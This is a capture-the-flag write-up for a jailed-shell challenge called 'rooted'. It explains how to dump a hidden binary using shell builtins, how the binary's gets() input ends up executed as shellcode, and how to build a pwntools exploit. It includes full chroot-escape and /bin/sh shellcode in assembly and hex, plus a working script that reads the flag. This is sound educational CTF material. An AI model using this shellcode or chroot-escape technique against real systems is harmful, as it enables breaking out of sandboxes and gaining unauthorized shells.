# SOLVE:


## initial discovery
We are given this description:
```
HA now you really can't move! I rooted you! There is no possible way to read my super secret file!
```
hmmm wonder what that could mean... have we already been pwned?

lets checkout the service and netcat to the port we get
```
$ nc chal.ctf.b01lers.com  2007
```

After playing around and seeing what we can run we realize that theres very few normal binaries available to us lets try some shell builtins:

```
>echo *
bin etc lib lib64
```

hmmm looks interesting if we play around some more we find:
```
>cd bin 
>echo .*
.admin_check
```

woah looks interesting but whats it do?
```
>.admin_check
Gimme Your Admin Commands:
adsfadsfasfasdf
adsfadsfasfasdf
Tnx Admin!
```

hmmmm seems to repeat our commands maybe we can grab the binary somehow?
normally you could just `cat` the binary, but that doesn't work since theres no cat binary in the jail

but we have shell builtins right? maybe we can read from it?
using our google foo we find a page: [link](https://unix.stackexchange.com/questions/261664/how-to-read-a-file-into-a-shell-script-as-a-variable)
we see here that we can read in a file like so:

```
>v="$(<.admin_check)"
```

What happens above is that the subshell created by `$(...)` has the file `.admin_check` set as its std in. So when the subshell returns its output into the string setup with the quotes `".."` the results are read into the quotes and stored in the variable v.   
While we was testing this we actually ran into an issue that this post solves by adding quotes around the subshell, remove them and you'll see that all the nullbytes in .admin\_check executable are actually clobbered into spaces due to shell interpretation of the bytes, so to make life easier just leave the quotes

so how do we actually read the bytes now that we can read a file? m
```
> echo $v
```
Great! now we just need to get it locally so we can reverse it. Remember, dropping the quotes here on the variable v will clobber the bytes of our binary.

Luckily, we know that nc is just one way to connect to a server! Personally, we like to use [pwntools](https://docs.pwntools.com/en/latest/) to run exploits in an automated fashion so lets get a script running that will grab us the file: 
```python
from pwn import *
import binascii
import time

### set  for  challenge ###
context(arch = 'amd64', os = 'linux')
addr = "chal.ctf.b01lers.com"
port = 2007
### set  for  challenge ###

###other setup
context.terminal = ['tmux', 'splitw', '-h']
p = remote(addr,port)

## PWN:
CHAR = ""

def command(c):
    p.sendlineafter(CHAR, c)

def grab_file():
    tag=b"ENDDDDDDDDDDD"
    command(b"echo -n \"$(<.admin_check)\""+tag)
    byt = p.recvuntil(tag, drop=True)
    with open("test", "wb") as f:
        f.write(byt)

if __name__ == "__main__":
    #input char from shell
    CHAR = ">"
    #setup directory
    command("cd bin")
    #grab bin data
    grab_file()
```
What this script will do is connect to our remote service, input our commands to get the binary and read it in from over the remote process. pwntools is super nice for this as it allready manages all the in/out of the remote process and we can use it to read from super easyily. The trick is to tack on a tag at the eendof our reading so that we know once we've reached the end of the file. we want to make sure to set it to some really long string that won't be in the actual file. adding the drop in the recvuntil cuts out the flag from the input making clean code.


Now we have the file!! time to see if we got an elf:
```bash
$file test
test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a2dfa6b580e059f6cc136bc052a48f9cb9ffd361, for GNU/Linux 3.2.0, with debug_info, not stripped
```
Sweet looks like we got the elf, which is good since we assumed the underlying host was running a linux os. lets throw it into our favorite RE tool ghidra. Why is it our favorite? Because ghidra decompiles it for us :) (Don't always trust the decompiled output, it can often lie to you, and you will get many headaches from not reading the assembly!) Luckily, this binary is nice and we can just read the output from ghidra here. To grab the decompiled output for main we can look at the functions tab, select main, and see the right tab for the decompiled output:
```c
int main(int argc,char **argv)
{
  __gid_t __rgid;
  undefined local_b8 [8];
  char buf [148];
  gid_t gid;
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("Gimme Your Admin Commands:");
  vuln(local_b8);
  puts("Tnx Admin!");
  (*(code *)local_b8)();
  puts("Finishing Executing Shellcode. Exiting now...");
  return 0;
}
```
Allright, so looks like if we can control the buffer stored at the local_b8 ptr, we can execute a function! (Seen from the ptr de reference using local\_b8 as a code pointer)  Hopping into vuln we can see how to set the data stored at this pointer:
```
void vuln(char *buf)

{
  gets(buf);
  puts(buf);
  return;
}
```
Looks like the typical gets vulnerability! Why is gets so bad? Check its man page under `BUGS` and you'll see the line *"Never use gets()"*. Essentially, we can write as many bytes to `buf` as we want, so we could attack a whole lot of this binary if we wanted to, but luckily we don't need to since whatever we write to buf will get executed once the buffer is called in the main function. 

Lastly we just want to check the permissions of the file using pwntools `checksec`:
```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Nice! Theres no NX! Normally [NX](https://en.wikipedia.org/wiki/W%5EX) is enabled to prevent memory segments from being both writable and executable (you'll see why this is a problem in a second). So this makes our lives way easier since the shellcode we write to the buffer will be executable once its called as a function!

## Shellcode Time
Time to write some shellcode, nasm wasn't installed on my ubuntu machine so went ahead and grabbed it:
```
sudo apt install nasm
```
The relevant `shell.py` and `shellcode.c` files are in the `solve/` directory, so if you're curious what those are feel free to go there. we wanted to explain briefly a quick introduction to shellcode writing both for my future self, and others actually reading this write up to learn :) 

Shellcode is essentially just really efficient assembly writing. This blog won't teach you x86_64 assembly, but heres some good resources: 
```
wikibooks: https://en.wikibooks.org/wiki/X86_Assembly
Linux system calls: https://syscall.sh/
```

Continuing on we need to escape from chroot using some shellcode so lets see if our friend exploitdb has some good sources:
```
x86 chroot escpae (clean code): https://www.exploit-db.com/shellcodes/13577
x64 /bin/sh execve: https://www.exploit-db.com/shellcodes/38150
```
Combining these two examples into one assembly file we gain: 
```
BITS 64
; mkdir("...", 0700);
push 83
pop rax, ;mkdir syscall
push byte 0x2e
push word 0x2e2e
mov rdi, rsp
mov rsi, 0700o
syscall

; chroot("...");
mov rax, 161
mov rdi, rsp
syscall 

; for (i = 100; i > 0; i--)
; {
; 	chdir("..");
; }
pop dx ; addr ".."
xor rcx, rcx
push rcx
push dx ;setup stack for ".."
mov cl, 100
up:
	mov rax, 80
	mov rdi, rsp
	push rcx ;preserve from clobber
	syscall
	pop rcx
loop up

; chroot(".");
mov rax, 61
xor rcx, rcx
mov [rsp + 1], cl
mov rdi, rsp
syscall

;execve(/bin/sh)
xor rax, rax
add rax, 59
xor rdi, rdi
push rdi
mov rdi, 0x68732F2f6e69622F
push rdi
lea rdi, [rsp] ;load in address of /bin/sh string
xor rsi, rsi
xor rdx, rdx
syscall
```
Overall this script breaks out of the chroot, (in an overkill fashion) by creating a new directory and rapidly changing directories back to hopefully cd into a directory outside of the root. If successful we can chroot to our new directory outside teh chroot, and execute a shell. This works becuase chroot is not really an effective security mechanism, and just designed to isolate filepaths not implement a full secure jail.  

The comments should help make clear what is happening for the most part, we'd like to document where we ran into some hiccups while morphing the x86 code to x64. The first part is converting the systemcalls to x64 convention which wasn't too bad, but the syscalls.sh website (linked above) came in super handy. 

The other really big issue came from the loop instruction. we had an issue where each iteration of the loop instruction would not properly decrement rcx as expected. Each loop rcx was set to some large hex value, so we had to do some googling [link](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f). Turns out the syscall instruction actually clobbers rcx, so like my comment says, we need to save rcx to the stack and pop it back after each `syscall`.

With our shellcode complete its time to test it!

Here are my steps we followed in writing the shellcode. we don't really write shellcode that often, so we'm sure there is a way to automate this process, but if you're still learning, doing this by hand is a good learning experience :) 
``` bash
#write shellcode into shellcode.asm
nasm -f elf64 shell.asm -o shellcode.o
ld shellcode.o -o shellcode
objdump -d shellcode
#highlight middle column bytes and place into shell.py
# only grab the bytes from the middle column 
python3 shell.py | xclip -selection clipboard
# test
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
Once our shellcode is compiled into the final executable we can test it on our system to see if it runs properly:
```bash
$./shellcode
$whoami
[YOURLINUXUSERNAME]
```
YEET it seems to be working!

Finally its time to add our shellcode into the pwntools script, so we can automate our way to the flag and glory!

```python
### shellcode
hexx = """
6a 53               
58                  
6a 2e               
66 68 2e 2e         
48 89 e7            
be c0 01 00 00      
0f 05               
b8 a1 00 00 00      
48 89 e7            
0f 05               
66 5a               
48 31 c9            
51                  
66 52               
b1 64               

b8 50 00 00 00      
48 89 e7            
51                  
0f 05               
59                  
e2 f2               
b8 3d 00 00 00      
48 31 c9            
88 4c 24 01         
48 89 e7            
0f 05               
48 31 c0            
48 83 c0 3b         
48 31 ff            
57                  
48 bf 2f 62 69 6e 2f
2f 73 68
57                  
48 8d 3c 24         
48 31 f6            
48 31 d2            
0f 05               
"""
asm = hexx.split("\n")
b = []
for a in asm:
    x = a.strip()
    b.append(x)
shellcode = ''.join(b).replace(" ","")
### shellcode

###OTHER STUFF FROM ABOVE###

def pwn():
    sh = binascii.unhexlify(shellcode)
    command(".admin_check")
    p.sendafter("Commands:", sh+b"\n")

if __name__ == "__main__":
    #input char from shell
    CHAR = ">"
    #setup directory
    command("cd bin")  
    #grab bin data
    grab_file()
    #run exploit!
    pwn()
    #grab flag!
    p.sendlineafter("Admin!","cat /home/rooted/flag.txt")
    p.recvline()
    print(p.recvline())
```

Allright all we've done now is add the shellcode functionality into the script. The trick is we have to unhexlify the shellcode in order to actually send the byte array of the shellcode over the pipe. Once we run the script, a shell is popped we send a command to cat the flag. 
Lets check the output to see if it runs: 
```
$ python3 solve.py
[+] Opening connection to chal.ctf.b01lers.com port 2007: Done
b'bctf{ch2007_p2073c75_p47h5_n07_h4ck5}\n'
```

Hope you enjoyed this challenge, I sure learned alot about actually building a ctf challenge during this process! The next post will go over mostly the changes of the more advanced binary in the rooted_v2 challenge, and skip all the steps I explained above! 

Feel free to contact me if you want about the challenge :) 

Happy Hacking :) 

#### Side Note:
we actually wrote this while solving the challenge myself haha
hope others found the challenge fun and interesting, we certainly learned alot while making it!

#### Side Note 2:
peda is great, if you want to intall it: 
```bash
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```
